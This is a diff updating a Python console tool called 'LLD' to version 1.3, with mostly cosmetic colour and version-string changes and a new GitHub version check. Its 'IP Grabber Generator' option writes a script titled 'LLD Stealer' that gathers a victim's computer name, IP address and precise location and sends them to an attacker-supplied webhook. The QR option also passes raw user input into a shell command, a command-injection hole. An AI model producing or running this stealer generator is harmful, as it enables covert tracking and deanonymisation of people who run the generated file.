@@ -2,10 +2,12 @@
 import os
 import requests
 import time
+import sys
 import colorama
 import messagebox
 from base64 import b64encode
 
+        
 def MenuCustom(text): # to remove this nasty ass code
     print(f"""
 {colorama.Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════════════════════════════╗
@@ -16,7 +18,7 @@ def MenuCustom(text): # to remove this nasty ass code
 {colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██║  ██║{colorama.Fore.LIGHTCYAN_EX}                       ║   ║  [{colorama.Fore.BLUE}Y{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Youtube{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}       ║
 {colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ███████╗███████╗██████╔╝{colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
 {colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ╚══════╝╚══════╝╚═════╝ {colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
-{colorama.Fore.LIGHTCYAN_EX}║                                                        v1.2 {colorama.Fore.RED}BETA{colorama.Fore.LIGHTCYAN_EX} ║   ╚══════════════════════╝
+{colorama.Fore.LIGHTCYAN_EX}║                                                        v1.3 {colorama.Fore.RED}BETA{colorama.Fore.LIGHTCYAN_EX} ║   ╚══════════════════════╝
 {colorama.Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════════════════════════════╝
 
 {colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}+{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} {text}
@@ -25,7 +27,7 @@ def MenuCustom(text): # to remove this nasty ass code
     
 
 def Home():
-    os.system('title LLD ^| Version 1.2')
+    os.system('title LLD ^| Version 1.3')
     os.system('cls')
     print(f"""
 {colorama.Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════════════════════════════╗
@@ -36,27 +38,47 @@ def Home():
 {colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██║  ██║{colorama.Fore.LIGHTCYAN_EX}                       ║   ║  [{colorama.Fore.BLUE}Y{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Youtube{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}       ║
 {colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ███████╗███████╗██████╔╝{colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
 {colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ╚══════╝╚══════╝╚═════╝ {colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
-{colorama.Fore.LIGHTCYAN_EX}║                                                        v1.2 {colorama.Fore.RED}BETA{colorama.Fore.LIGHTCYAN_EX} ║   ╚══════════════════════╝
+{colorama.Fore.LIGHTCYAN_EX}║                                                        v1.3 {colorama.Fore.RED}BETA{colorama.Fore.LIGHTCYAN_EX} ║   ╚══════════════════════╝
 {colorama.Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════════════════════════════╝
 
-{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}01{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} IP Geolocation
-{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}02{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} URL to QR Code
-{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}03{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Base64 Encoder
-{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}04{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Generate IP Grabber
+{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}01{colorama.Fore.LIGHTCYAN_EX}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} IP Geolocation
+{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}02{colorama.Fore.LIGHTCYAN_EX}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} URL to QR Code
+{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}03{colorama.Fore.LIGHTCYAN_EX}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Base64 Encoder
+{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}04{colorama.Fore.LIGHTCYAN_EX}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Generate IP Grabber
 
 """)
 
+CurrentVersion = 'v1.3'
+version_url = 'https://raw.githubusercontent.com/questionMrk/LLD/main/VersionData'
+
+
+try:
+    response = requests.get(version_url)
+    response.raise_for_status() 
+
+    github_version = response.text.strip()
+
+    if CurrentVersion == github_version:
+        Home()
+    else:
+        print(f"You have the wrong LLD version downloaded! Go to the GitHub and download {github_version}")
+        messagebox.showinfo('LLD New Update!', f"""
+You have the wrong version of LLD downloaded!
+Go to the GitHub, https://github.com/questionMrk/LLD/ and download the new version: {github_version}
+""")
+except requests.exceptions.RequestException as e:
+    print(f"Error fetching version data: {e}")
 
 def Main():
     while True:
         Home()
-        option = input(f"{colorama.Fore.BLUE}Enter Option: {colorama.Fore.WHITE}")
+        option = input(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}-{colorama.Fore.LIGHTCYAN_EX}]{colorama.Fore.BLUE} Enter Option: {colorama.Fore.WHITE}")
         
         if option in {"01", "1"}:
             os.system('cls')
-            os.system('title LLD ^| IP Geolocation ^| Version 1.2')
+            os.system('title LLD ^| IP Geolocation ^| Version 1.3')
             MenuCustom('Ip Geolocation')
-            ip_addr = input("Enter IP/Domain: ")
+            ip_addr = input(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}-{colorama.Fore.LIGHTCYAN_EX}]{colorama.Fore.BLUE} Enter IP/Domain: {colorama.Fore.WHITE}")
             response = requests.get(f'https://ipapi.co/{ip_addr}/json')
 
             if response.status_code == 200:
@@ -88,9 +110,9 @@ def Main():
 
         elif option in {"02", "2"}:
             os.system('cls')
-            os.system('title LLD ^| URL to QR Code ^| Version 1.2')
+            os.system('title LLD ^| URL to QR Code ^| Version 1.3')
             MenuCustom('URL to QR Code')
-            url = input(f"{colorama.Fore.BLUE}Enter URL: {colorama.Fore.WHITE}")
+            url = input(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}-{colorama.Fore.LIGHTBLUE_EX}]{colorama.Fore.BLUE}Enter URL: {colorama.Fore.WHITE}")
             os.system(f'curl qrcode.show/{url}')
 
             print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.YELLOW}!{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Press any key to go back")
@@ -98,21 +120,21 @@ def Main():
             Home()
         elif option in {"03", "3"}:
             os.system('cls')
-            os.system('title LLD ^| Base64 Encoder ^| Version 1.2')
+            os.system('title LLD ^| Base64 Encoder ^| Version 1.3')
             MenuCustom('Base64 Encoder')
-            Enter_code = input(f'{colorama.Fore.BLUE}Enter Something you want to encode: {colorama.Fore.WHITE}')
+            Enter_code = input(f'{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}-{colorama.Fore.LIGHTCYAN_EX}]{colorama.Fore.BLUE} Enter Something you want to encode: {colorama.Fore.WHITE}')
             
             encoded = b64encode(Enter_code.encode('utf-8'))
             print(f"{colorama.Fore.BLUE}Encoded Version: {encoded}")
-            print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.YELLOW}!{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Press any key to go back")
+            print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}-{colorama.Fore.LIGHTCYAN_EX}]{colorama.Fore.BLUE} Press any key to go back")
             os.system('pause >nul')
             Home()
 
         elif option in {"04", "4"}:
             os.system('cls')
-            os.system('title LLD ^| IP Grabber Generator ^| Version 1.2')
+            os.system('title LLD ^| IP Grabber Generator ^| Version 1.3')
             MenuCustom('IP Grabber Generator')
-            webhookurl = input(f"{colorama.Fore.BLUE}Enter Webhook: {colorama.Fore.WHITE}")
+            webhookurl = input(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}-{colorama.Fore.LIGHTCYAN_EX}]{colorama.Fore.BLUE} Enter Webhook: {colorama.Fore.WHITE}")
             ewContent = f"""
 import requests
 import os
@@ -138,7 +160,7 @@ def get_ip_info():
             'title': 'LLD Stealer',
             'description': f'Computer Name: {{cpn}}\\nIP Address: {{ip}}\\nNetwork: {{network}}\\nCity: {{city}}\\nRegion: {{region}}\\nCountry: {{countryname}}\\nPostal: {{postal}}\\nLatitude: {{latitude}}\\nLongitude: {{longitude}}\\nCalling Code: {{calling_code}}\\n[Google Maps]({{google__maps}})',
             'footer': {{
-                'text': 'LLD v1.2 BETA'
+                'text': 'LLD v1.3 BETA'
             }},
             'color': 16711680
         }}
